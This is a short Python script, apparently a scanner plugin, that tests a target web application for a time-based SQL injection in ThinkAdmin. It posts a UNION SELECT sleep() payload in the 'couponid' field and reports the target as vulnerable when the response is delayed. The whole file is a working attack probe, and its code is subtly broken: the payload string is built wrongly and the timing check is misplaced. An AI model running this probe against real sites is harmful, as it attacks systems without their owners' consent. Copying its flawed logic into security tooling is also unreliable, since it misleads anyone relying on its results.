#!/usr/bin/env python
#-*- coding:utf-8 -*-
import requests
import time

def check(url):
    results = []
    items = {
        "Url": url, 
        "Vuln": 'thinkadmin_sql_injection_post', 
        "Type": None, 
        "Payload": None
    }

    payload = '?s=/home/user/checkcode/'
    def make_data(sleep_time):
        data = {'couponid': f"1') union select sleep('''+str({sleep_time})+''')#"}
        return data 

    try:
        for i in range(1,2):
            data = make_data(1)
            requests.post(url= url + payload, files=data)
            timea = time.time()

            data = make_data(5)
            requests.post(url= url + payload, files=data)
            timeb = time.time()
            if timeb - timea > 4.5:
                items['Type'] = 'POST'
                items['Payload'] = payload + "data: couponid = 1') union select sleep('''+str(sleep_time)+''')#"
                results.append(items)
                break
        
        return results
    except Exception as e:
        return e

if __name__ == '__main__':
    pass